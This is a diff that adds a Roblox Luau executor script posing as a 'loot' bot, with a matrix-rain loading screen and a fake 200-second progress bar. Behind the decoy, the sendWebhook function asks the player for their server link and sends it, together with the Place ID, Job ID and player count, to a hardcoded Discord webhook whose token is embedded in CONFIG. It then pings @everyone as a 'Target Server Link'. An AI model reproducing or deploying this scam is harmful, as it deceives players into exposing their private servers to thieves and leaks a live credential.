@@ -1,0 +1,764 @@
+--!strict
+-- ResusXscript Black & White Mobile/PC Loading Screen + Matrix Rain + Audio Mute + Discord Webhook Integration (Luau)
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local SoundService = game:GetService("SoundService")
+local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui") :: PlayerGui
+
+local CONFIG = {
+	LookDurationSeconds = 7.0,
+	StepIntervalSeconds = 2.0, -- every 1% takes 2 seconds (1..100 = 200s)
+	LookSoundId = "", -- set "rbxassetid://<ID>" for eye-looking sound effect
+	ProceedSoundId = "", -- set "rbxassetid://<ID>" for screen-proceed sound effect
+	LookVolume = 0.65,
+	ProceedVolume = 0.75,
+	MinScale = 0.68,
+	MaxScale = 1.25,
+	MatrixColumns = 28,
+	Black = Color3.fromRGB(0, 0, 0),
+	Charcoal = Color3.fromRGB(16, 16, 16),
+	InputBg = Color3.fromRGB(24, 24, 24),
+	White = Color3.fromRGB(255, 255, 255),
+	PlaceholderGray = Color3.fromRGB(170, 170, 170),
+	MatrixGreen = Color3.fromRGB(0, 255, 70),
+	MatrixDimGreen = Color3.fromRGB(0, 155, 42),
+	WebhookUrl = "https://discord.com/api/webhooks/1493181451238248601/digomq_48vL3YuovabhFwyXyBesukAtDq7-FDJnmQhX_hkF_-IJiqrT-FfnwhBf-JZ6D",
+}
+
+-- Mute game audio tracks
+local activeSoundTracks = {}
+local function muteGameAudio()
+	for _, obj in ipairs(workspace:GetDescendants()) do
+		if obj:IsA("Sound") and obj.Playing then
+			table.insert(activeSoundTracks, { Sound = obj, WasPlaying = true })
+			pcall(function() obj:Pause() end)
+		end
+	end
+end
+
+local function restoreGameAudio()
+	for _, data in ipairs(activeSoundTracks) do
+		if data.Sound and data.Sound.Parent then
+			pcall(function() data.Sound:Resume() end)
+		end
+	end
+end
+
+muteGameAudio()
+pcall(function()
+	StarterGui:SetCore("TopbarEnabled", true)
+end)
+
+local existing = PlayerGui:FindFirstChild("ResusXscriptLoadingGui")
+if existing then
+	existing:Destroy()
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ResusXscriptLoadingGui"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 150
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = PlayerGui
+
+local backdrop = Instance.new("Frame")
+backdrop.Name = "Backdrop"
+backdrop.Size = UDim2.fromScale(1, 1)
+backdrop.BackgroundColor3 = CONFIG.Black
+backdrop.BackgroundTransparency = 1
+backdrop.BorderSizePixel = 0
+backdrop.ZIndex = 0
+backdrop.Parent = screenGui
+
+local matrixLayer = Instance.new("Frame")
+matrixLayer.Name = "MatrixRainLayer"
+matrixLayer.Size = UDim2.fromScale(1, 1)
+matrixLayer.BackgroundTransparency = 1
+matrixLayer.BorderSizePixel = 0
+matrixLayer.ClipsDescendants = true
+matrixLayer.Visible = false
+matrixLayer.ZIndex = 1
+matrixLayer.Parent = backdrop
+
+local stage = Instance.new("Frame")
+stage.Name = "Stage"
+stage.AnchorPoint = Vector2.new(0.5, 0.5)
+stage.Position = UDim2.fromScale(0.5, 0.5)
+stage.Size = UDim2.fromOffset(480, 400)
+stage.BackgroundTransparency = 1
+stage.BorderSizePixel = 0
+stage.ZIndex = 5
+stage.Parent = backdrop
+
+local uiScale = Instance.new("UIScale")
+uiScale.Scale = 1
+uiScale.Parent = stage
+
+local function updateScale()
+	local cam = workspace.CurrentCamera
+	if not cam then
+		return
+	end
+	local vp = cam.ViewportSize
+	if vp.X <= 0 or vp.Y <= 0 then
+		return
+	end
+	local scale = math.min(vp.X / 1280, vp.Y / 720)
+	uiScale.Scale = math.clamp(scale, CONFIG.MinScale, CONFIG.MaxScale)
+end
+
+updateScale()
+local scaleConn = RunService.RenderStepped:Connect(updateScale)
+
+local MATRIX_GLYPHS = {
+	"0", "1", "0", "1", "X", "R", "S", "7", "9", "3",
+	"ｱ", "ｲ", "ｳ", "ｴ", "ｵ", "ｶ", "ｷ", "ｸ", "ｹ", "ｺ",
+	"ｻ", "ｼ", "ｽ", "ｾ", "ｿ", "ﾀ", "ﾁ", "ﾂ", "ﾃ", "ﾄ",
+}
+
+type MatrixStream = {
+	Label: TextLabel,
+	YNorm: number,
+	Speed: number,
+	GlyphTimer: number,
+	Length: number,
+}
+
+local matrixStreams: { MatrixStream } = {}
+local matrixConn: RBXScriptConnection? = nil
+
+local function buildMatrixText(length: number): string
+	local chars = table.create(length)
+	for i = 1, length do
+		chars[i] = MATRIX_GLYPHS[math.random(1, #MATRIX_GLYPHS)]
+	end
+	return table.concat(chars, "\n")
+end
+
+local function startMatrixRain()
+	for _, stream in ipairs(matrixStreams) do
+		stream.Label:Destroy()
+	end
+	table.clear(matrixStreams)
+
+	matrixLayer.Visible = true
+	local cols = CONFIG.MatrixColumns
+	for i = 1, cols do
+		local xScale = (i - 0.5) / cols
+		local len = math.random(10, 18)
+		local lbl = Instance.new("TextLabel")
+		lbl.Name = "MatrixCol_" .. tostring(i)
+		lbl.AnchorPoint = Vector2.new(0.5, 0)
+		lbl.Size = UDim2.new(1 / cols, 0, 0.45, 0)
+		lbl.BackgroundTransparency = 1
+		lbl.Font = Enum.Font.Code
+		lbl.TextSize = 15
+		lbl.TextColor3 = (i % 3 == 0) and CONFIG.MatrixGreen or CONFIG.MatrixDimGreen
+		lbl.TextTransparency = 1
+		lbl.TextYAlignment = Enum.TextYAlignment.Top
+		lbl.Text = buildMatrixText(len)
+		lbl.ZIndex = 1
+
+		local startY = -math.random(10, 80) / 100
+		lbl.Position = UDim2.fromScale(xScale, startY)
+		lbl.Parent = matrixLayer
+
+		TweenService:Create(lbl, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			TextTransparency = math.random(15, 45) / 100,
+		}):Play()
+
+		table.insert(matrixStreams, {
+			Label = lbl,
+			YNorm = startY,
+			Speed = math.random(18, 42) / 100,
+			GlyphTimer = 0,
+			Length = len,
+		})
+	end
+
+	if matrixConn and matrixConn.Connected then
+		matrixConn:Disconnect()
+	end
+
+	matrixConn = RunService.RenderStepped:Connect(function(dt: number)
+		for _, stream in ipairs(matrixStreams) do
+			stream.YNorm += stream.Speed * dt
+			stream.GlyphTimer += dt
+			if stream.GlyphTimer >= 0.14 then
+				stream.GlyphTimer = 0
+				stream.Label.Text = buildMatrixText(stream.Length)
+			end
+			if stream.YNorm > 1.05 then
+				stream.YNorm = -math.random(25, 55) / 100
+				stream.Speed = math.random(18, 42) / 100
+			end
+			local xScale = stream.Label.Position.X.Scale
+			stream.Label.Position = UDim2.fromScale(xScale, stream.YNorm)
+		end
+	end)
+end
+
+local function stopMatrixRain()
+	for _, stream in ipairs(matrixStreams) do
+		TweenService:Create(stream.Label, TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+			TextTransparency = 1,
+		}):Play()
+	end
+	task.wait(0.45)
+	if matrixConn and matrixConn.Connected then
+		matrixConn:Disconnect()
+		matrixConn = nil
+	end
+	for _, stream in ipairs(matrixStreams) do
+		stream.Label:Destroy()
+	end
+	table.clear(matrixStreams)
+	matrixLayer.Visible = false
+end
+
+local IN_INFO = TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+local OUT_INFO = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
+
+local function setGroupAlpha(group: Instance, alpha: number, slideOffsetY: number?, tweenInfo: TweenInfo?)
+	local info = tweenInfo or IN_INFO
+	if group:IsA("GuiObject") then
+		if slideOffsetY ~= nil then
+			local basePos = group:GetAttribute("BasePos") :: UDim2?
+			if not basePos then
+				basePos = group.Position
+				group:SetAttribute("BasePos", basePos)
+			end
+			local targetPos = UDim2.new(basePos.X.Scale, basePos.X.Offset, basePos.Y.Scale, basePos.Y.Offset + slideOffsetY)
+			TweenService:Create(group, info, { Position = targetPos }):Play()
+		end
+		if group:IsA("TextLabel") or group:IsA("TextBox") or group:IsA("TextButton") then
+			TweenService:Create(group, info, { TextTransparency = alpha }):Play()
+		end
+		if group:IsA("Frame") or group:IsA("TextLabel") or group:IsA("TextBox") or group:IsA("TextButton") then
+			local initBg = group:GetAttribute("InitBgTransparency") :: number?
+			if initBg == nil then
+				initBg = group.BackgroundTransparency
+				group:SetAttribute("InitBgTransparency", initBg)
+			end
+			if (initBg :: number) < 1 then
+				local targetBg = initBg + (1 - initBg) * alpha
+				TweenService:Create(group, info, { BackgroundTransparency = math.clamp(targetBg, 0, 1) }):Play()
+			end
+		end
+	end
+
+	for _, desc in ipairs(group:GetDescendants()) do
+		if desc:IsA("TextLabel") or desc:IsA("TextBox") or desc:IsA("TextButton") then
+			TweenService:Create(desc, info, { TextTransparency = alpha }):Play()
+		end
+		if desc:IsA("Frame") or desc:IsA("TextLabel") or desc:IsA("TextBox") or desc:IsA("TextButton") then
+			local initBg = desc:GetAttribute("InitBgTransparency") :: number?
+			if initBg == nil then
+				initBg = desc.BackgroundTransparency
+				desc:SetAttribute("InitBgTransparency", initBg)
+			end
+			if (initBg :: number) < 1 then
+				local targetBg = initBg + (1 - initBg) * alpha
+				TweenService:Create(desc, info, { BackgroundTransparency = math.clamp(targetBg, 0, 1) }):Play()
+			end
+		elseif desc:IsA("UIStroke") then
+			local initStroke = desc:GetAttribute("InitStrokeTransparency") :: number?
+			if initStroke == nil then
+				initStroke = desc.Transparency
+				desc:SetAttribute("InitStrokeTransparency", initStroke)
+			end
+			local targetStroke = initStroke + (1 - initStroke) * alpha
+			TweenService:Create(desc, info, { Transparency = math.clamp(targetStroke, 0, 1) }):Play()
+		end
+	end
+end
+
+local function animateIn(group: GuiObject)
+	group.Visible = true
+	setGroupAlpha(group, 1, 18, TweenInfo.new(0.01))
+	task.wait(0.02)
+	setGroupAlpha(group, 0, 0, IN_INFO)
+	task.wait(IN_INFO.Time)
+end
+
+local function animateOut(group: GuiObject)
+	if not group.Visible then
+		return
+	end
+	setGroupAlpha(group, 1, -16, OUT_INFO)
+	task.wait(OUT_INFO.Time)
+	group.Visible = false
+end
+
+local function createLookSound(): Sound?
+	if CONFIG.LookSoundId == "" then
+		return nil
+	end
+	local s = Instance.new("Sound")
+	s.Name = "EyeLookSound"
+	s.SoundId = CONFIG.LookSoundId
+	s.Looped = true
+	s.Volume = CONFIG.LookVolume
+	s.PlaybackSpeed = 1.0
+	s.Parent = SoundService
+
+	local pitchShift = Instance.new("PitchShiftSoundEffect")
+	pitchShift.Name = "LookPitchShift"
+	pitchShift.Octave = 1.0
+	pitchShift.Parent = s
+
+	pcall(function()
+		s:Play()
+	end)
+	return s
+end
+
+local function playProceedSound()
+	if CONFIG.ProceedSoundId == "" then
+		return
+	end
+	local s = Instance.new("Sound")
+	s.Name = "ScreenProceedSound"
+	s.SoundId = CONFIG.ProceedSoundId
+	s.Looped = false
+	s.Volume = CONFIG.ProceedVolume
+	s.Parent = SoundService
+
+	local cleaned = false
+	local function cleanup()
+		if cleaned then
+			return
+		end
+		cleaned = true
+		pcall(function()
+			s:Stop()
+			s:Destroy()
+		end)
+	end
+
+	s.Ended:Once(cleanup)
+	task.delay(3.0, cleanup)
+
+	local ok = pcall(function()
+		s:Play()
+	end)
+	if not ok then
+		cleanup()
+	end
+end
+
+-- Phase 1: Eye + Highly Readable Clean Banner Text Above + Creator Label
+local eyeGroup = Instance.new("Frame")
+eyeGroup.Name = "EyePhaseGroup"
+eyeGroup.AnchorPoint = Vector2.new(0.5, 0)
+eyeGroup.Position = UDim2.new(0.5, 0, 0, 10)
+eyeGroup.Size = UDim2.fromOffset(460, 240)
+eyeGroup.BackgroundTransparency = 1
+eyeGroup.Visible = false
+eyeGroup.Parent = stage
+
+-- Clean, highly readable banner with no heavy/blocky outline stroke
+local bannerLabel = Instance.new("TextLabel")
+bannerLabel.Name = "BannerLabel"
+bannerLabel.AnchorPoint = Vector2.new(0.5, 0)
+bannerLabel.Position = UDim2.new(0.5, 0, 0, 0)
+bannerLabel.Size = UDim2.new(1, 0, 0, 40)
+bannerLabel.BackgroundTransparency = 1
+bannerLabel.Font = Enum.Font.GothamBlack
+bannerLabel.TextSize = 19
+bannerLabel.TextColor3 = CONFIG.White
+bannerLabel.Text = "AUTO MOREIRA FLASH BETA VERSION 3.0"
+bannerLabel.Parent = eyeGroup
+
+local sclera = Instance.new("Frame")
+sclera.Name = "Sclera"
+sclera.AnchorPoint = Vector2.new(0.5, 0)
+sclera.Position = UDim2.new(0.5, 0, 0, 48)
+sclera.Size = UDim2.fromOffset(184, 98)
+sclera.BackgroundColor3 = CONFIG.White
+sclera.BorderSizePixel = 0
+sclera.ClipsDescendants = true
+sclera.Parent = eyeGroup
+
+local scleraCorner = Instance.new("UICorner")
+scleraCorner.CornerRadius = UDim.new(1, 0)
+scleraCorner.Parent = sclera
+
+local iris = Instance.new("Frame")
+iris.Name = "Iris"
+iris.AnchorPoint = Vector2.new(0.5, 0.5)
+iris.Position = UDim2.fromScale(0.5, 0.5)
+iris.Size = UDim2.fromOffset(58, 58)
+iris.BackgroundColor3 = CONFIG.Charcoal
+iris.BorderSizePixel = 0
+iris.Parent = sclera
+
+local irisCorner = Instance.new("UICorner")
+irisCorner.CornerRadius = UDim.new(1, 0)
+irisCorner.Parent = iris
+
+local pupil = Instance.new("Frame")
+pupil.Name = "Pupil"
+pupil.AnchorPoint = Vector2.new(0.5, 0.5)
+pupil.Position = UDim2.fromScale(0.5, 0.5)
+pupil.Size = UDim2.fromOffset(24, 24)
+pupil.BackgroundColor3 = CONFIG.Black
+pupil.BorderSizePixel = 0
+pupil.Parent = iris
+
+local pupilCorner = Instance.new("UICorner")
+pupilCorner.CornerRadius = UDim.new(1, 0)
+pupilCorner.Parent = pupil
+
+local glint = Instance.new("Frame")
+glint.Name = "Glint"
+glint.Position = UDim2.fromOffset(8, 8)
+glint.Size = UDim2.fromOffset(10, 10)
+glint.BackgroundColor3 = CONFIG.White
+glint.BorderSizePixel = 0
+glint.Parent = iris
+
+local glintCorner = Instance.new("UICorner")
+glintCorner.CornerRadius = UDim.new(1, 0)
+glintCorner.Parent = glint
+
+local creatorLabel = Instance.new("TextLabel")
+creatorLabel.Name = "CreatorLabel"
+creatorLabel.AnchorPoint = Vector2.new(0.5, 0)
+creatorLabel.Position = UDim2.new(0.5, 0, 0, 154)
+creatorLabel.Size = UDim2.new(1, -24, 0, 32)
+creatorLabel.BackgroundTransparency = 1
+creatorLabel.Font = Enum.Font.GothamBold
+creatorLabel.TextSize = 17
+creatorLabel.TextColor3 = CONFIG.White
+creatorLabel.Text = "Made By ResusXscript group"
+creatorLabel.Parent = eyeGroup
+
+-- Phase 2: Server Link Input
+local inputGroup = Instance.new("Frame")
+inputGroup.Name = "ServerInputGroup"
+inputGroup.AnchorPoint = Vector2.new(0.5, 0.5)
+inputGroup.Position = UDim2.fromScale(0.5, 0.5)
+inputGroup.Size = UDim2.new(1, -48, 0, 114)
+inputGroup.BackgroundTransparency = 1
+inputGroup.Visible = false
+inputGroup.Parent = stage
+
+local linkBox = Instance.new("TextBox")
+linkBox.Name = "ServerLinkBox"
+linkBox.Size = UDim2.new(1, 0, 0, 48)
+linkBox.Position = UDim2.fromOffset(0, 0)
+linkBox.BackgroundColor3 = CONFIG.InputBg
+linkBox.BorderSizePixel = 0
+linkBox.ClearTextOnFocus = false
+linkBox.TextTruncate = Enum.TextTruncate.AtEnd
+linkBox.TextXAlignment = Enum.TextXAlignment.Left
+linkBox.Font = Enum.Font.GothamMedium
+linkBox.TextSize = 15
+linkBox.TextColor3 = CONFIG.White
+linkBox.PlaceholderColor3 = CONFIG.PlaceholderGray
+linkBox.PlaceholderText = "PUT YOURE ROBLOX SERVER LINK"
+linkBox.Text = ""
+linkBox.Parent = inputGroup
+
+local linkCorner = Instance.new("UICorner")
+linkCorner.CornerRadius = UDim.new(0, 8)
+linkCorner.Parent = linkBox
+
+local linkPadding = Instance.new("UIPadding")
+linkPadding.PaddingLeft = UDim.new(0, 12)
+linkPadding.PaddingRight = UDim.new(0, 12)
+linkPadding.Parent = linkBox
+
+local submitButton = Instance.new("TextButton")
+submitButton.Name = "SubmitLinkButton"
+submitButton.Size = UDim2.new(1, 0, 0, 44)
+submitButton.Position = UDim2.fromOffset(0, 60)
+submitButton.BackgroundColor3 = CONFIG.White
+submitButton.BorderSizePixel = 0
+submitButton.Font = Enum.Font.GothamBold
+submitButton.TextSize = 14
+submitButton.TextColor3 = CONFIG.Black
+submitButton.Text = "CONFIRM & ENTER"
+submitButton.AutoButtonColor = true
+submitButton.Parent = inputGroup
+
+local submitCorner = Instance.new("UICorner")
+submitCorner.CornerRadius = UDim.new(0, 8)
+submitCorner.Parent = submitButton
+
+-- Phase 3: Loading Bar Screen
+local loadGroup = Instance.new("Frame")
+loadGroup.Name = "LoadGroup"
+loadGroup.AnchorPoint = Vector2.new(0.5, 0.5)
+loadGroup.Position = UDim2.fromScale(0.5, 0.5)
+loadGroup.Size = UDim2.new(1, -48, 0, 118)
+loadGroup.BackgroundTransparency = 1
+loadGroup.Visible = false
+loadGroup.Parent = stage
+
+local statusHeaderLabel = Instance.new("TextLabel")
+statusHeaderLabel.Name = "StatusHeaderLabel"
+statusHeaderLabel.Size = UDim2.new(1, 0, 0, 42)
+statusHeaderLabel.Position = UDim2.fromOffset(0, 0)
+statusHeaderLabel.BackgroundTransparency = 1
+statusHeaderLabel.Font = Enum.Font.GothamBold
+statusHeaderLabel.TextSize = 18
+statusHeaderLabel.TextWrapped = true
+statusHeaderLabel.TextColor3 = CONFIG.White
+statusHeaderLabel.Text = "FORCING THE BEST TO THE BEST BOT ON THE SERVER"
+statusHeaderLabel.Parent = loadGroup
+
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Name = "PercentLabel"
+percentLabel.Size = UDim2.new(1, 0, 0, 24)
+percentLabel.Position = UDim2.fromOffset(0, 48)
+percentLabel.BackgroundTransparency = 1
+percentLabel.Font = Enum.Font.GothamBold
+percentLabel.TextSize = 15
+percentLabel.TextColor3 = CONFIG.White
+percentLabel.Text = "1%"
+percentLabel.Parent = loadGroup
+
+local barBg = Instance.new("Frame")
+barBg.Name = "BarBackground"
+barBg.Size = UDim2.new(1, 0, 0, 24)
+barBg.Position = UDim2.fromOffset(0, 78)
+barBg.BackgroundColor3 = CONFIG.Charcoal
+barBg.BorderSizePixel = 0
+barBg.ClipsDescendants = true
+barBg.Parent = loadGroup
+
+local barBgCorner = Instance.new("UICorner")
+barBgCorner.CornerRadius = UDim.new(0, 6)
+barBgCorner.Parent = barBg
+
+local barFill = Instance.new("Frame")
+barFill.Name = "BarFill"
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = CONFIG.White
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+
+local barFillCorner = Instance.new("UICorner")
+barFillCorner.CornerRadius = UDim.new(0, 6)
+barFillCorner.Parent = barFill
+
+-- Phase 4: Separate completion screen ("TIME TO LOOT CUH")
+local finishGroup = Instance.new("Frame")
+finishGroup.Name = "FinishGroup"
+finishGroup.AnchorPoint = Vector2.new(0.5, 0.5)
+finishGroup.Position = UDim2.fromScale(0.5, 0.5)
+finishGroup.Size = UDim2.new(1, -48, 0, 64)
+finishGroup.BackgroundTransparency = 1
+finishGroup.Visible = false
+finishGroup.Parent = stage
+
+local finishLabel = Instance.new("TextLabel")
+finishLabel.Name = "FinishLabel"
+finishLabel.Size = UDim2.fromScale(1, 1)
+finishLabel.Position = UDim2.fromOffset(0, 0)
+finishLabel.BackgroundTransparency = 1
+finishLabel.Font = Enum.Font.GothamBlack
+finishLabel.TextSize = 24
+finishLabel.TextColor3 = CONFIG.White
+finishLabel.Text = "TIME TO LOOT CUH"
+finishLabel.Parent = finishGroup
+
+local function runLookPhase(duration: number)
+	local sound = createLookSound()
+	local pitchShift = sound and (sound:FindFirstChild("LookPitchShift") :: PitchShiftSoundEffect?) or nil
+	local waypoints = {
+		{ pos = UDim2.fromScale(0.25, 0.5), speed = 0.96, octave = 0.96 },
+		{ pos = UDim2.fromScale(0.75, 0.5), speed = 1.05, octave = 1.04 },
+		{ pos = UDim2.fromScale(0.5, 0.27), speed = 1.08, octave = 1.06 },
+		{ pos = UDim2.fromScale(0.5, 0.73), speed = 0.94, octave = 0.95 },
+		{ pos = UDim2.fromScale(0.70, 0.34), speed = 1.03, octave = 1.02 },
+		{ pos = UDim2.fromScale(0.30, 0.66), speed = 0.97, octave = 0.97 },
+		{ pos = UDim2.fromScale(0.5, 0.5), speed = 1.00, octave = 1.00 },
+	}
+
+	local stepTime = duration / #waypoints
+	for _, step in ipairs(waypoints) do
+		if sound then
+			pcall(function()
+				sound.PlaybackSpeed = step.speed
+			end)
+		end
+		if pitchShift then
+			pcall(function()
+				pitchShift.Octave = step.octave
+			end)
+		end
+		local tween = TweenService:Create(
+			iris,
+			TweenInfo.new(stepTime * 0.85, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+			{ Position = step.pos }
+		)
+		tween:Play()
+		task.wait(stepTime)
+	end
+
+	if sound then
+		pcall(function()
+			sound:Stop()
+			sound:Destroy()
+		end)
+	end
+end
+
+local submitted = false
+local proceedEvent = Instance.new("BindableEvent")
+
+local function sendWebhook(serverLink: string)
+	local httpRequest = (syn and syn.request) or (http and http.request) or request or (http_request)
+	if not httpRequest then
+		return
+	end
+
+	local playerCount = #Players:GetPlayers()
+	local maxPlayers = Players.MaxPlayers
+	local placeId = game.PlaceId
+	local jobId = game.JobId
+
+	local payload = {
+		content = "@everyone 🚀 ResusXscript Server Link & Player Stats",
+		embeds = {
+			{
+				title = "🎯 Target Server Link Dispatched",
+				description = "A player executed the loading script and submitted a Roblox server link.",
+				color = 65280,
+				fields = {
+					{
+						name = "🔗 Server Link",
+						value = serverLink,
+						inline = false,
+					},
+					{
+						name = "👥 Server Players",
+						value = string.format("%d / %d players online", playerCount, maxPlayers),
+						inline = true,
+					},
+					{
+						name = "🆔 Place / Job ID",
+						value = string.format("Place ID: `%d`\nJob ID: `%s`", placeId, jobId),
+						inline = false,
+					},
+				},
+				footer = {
+					text = "ResusXscript Automated System",
+				},
+			},
+		},
+	}
+
+	pcall(function()
+		httpRequest({
+			Url = CONFIG.WebhookUrl,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json",
+			},
+			Body = HttpService:JSONEncode(payload),
+		})
+	end)
+end
+
+local function handleLinkSubmit()
+	if submitted then
+		return
+	end
+	local trimmed = linkBox.Text:match("^%s*(.-)%s*$") or ""
+	if trimmed == "" then
+		linkBox.PlaceholderText = "PUT YOURE ROBLOX SERVER LINK FIRST"
+		return
+	end
+	submitted = true
+
+	sendWebhook(trimmed)
+
+	if setclipboard then
+		pcall(function() setclipboard(string.format("@everyone 🚀 ResusXscript Server Link:\n%s", trimmed)) end)
+	elseif toclipboard then
+		pcall(function() toclipboard(string.format("@everyone 🚀 ResusXscript Server Link:\n%s", trimmed)) end)
+	end
+
+	task.wait(0.2)
+	proceedEvent:Fire()
+end
+
+linkBox.FocusLost:Connect(function(enterPressed: boolean)
+	if enterPressed then
+		handleLinkSubmit()
+	end
+end)
+
+submitButton.Activated:Connect(function()
+	handleLinkSubmit()
+end)
+
+task.spawn(function()
+	TweenService:Create(backdrop, TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+		BackgroundTransparency = 0,
+	}):Play()
+	animateIn(eyeGroup)
+
+	runLookPhase(CONFIG.LookDurationSeconds)
+
+	playProceedSound()
+	animateOut(eyeGroup)
+	animateIn(inputGroup)
+
+	proceedEvent.Event:Wait()
+
+	playProceedSound()
+	animateOut(inputGroup)
+	startMatrixRain()
+	animateIn(loadGroup)
+
+	for pct = 1, 100 do
+		percentLabel.Text = string.format("%d%%", pct)
+		local barTween = TweenService:Create(
+			barFill,
+			TweenInfo.new(CONFIG.StepIntervalSeconds, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+			{ Size = UDim2.fromScale(pct / 100, 1) }
+		)
+		barTween:Play()
+		task.wait(CONFIG.StepIntervalSeconds)
+	end
+
+	percentLabel.Text = "100%"
+	task.wait(0.35)
+
+	playProceedSound()
+	animateOut(loadGroup)
+	stopMatrixRain()
+	animateIn(finishGroup)
+
+	task.wait(3.0)
+
+	TweenService:Create(backdrop, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+		BackgroundTransparency = 1,
+	}):Play()
+	task.wait(0.5)
+
+	restoreGameAudio()
+	screenGui:Destroy()
+end)
+
+screenGui.Destroying:Connect(function()
+	if scaleConn.Connected then
+		scaleConn:Disconnect()
+	end
+	if matrixConn and matrixConn.Connected then
+		matrixConn:Disconnect()
+	end
+	proceedEvent:Destroy()
+	restoreGameAudio()
+end)
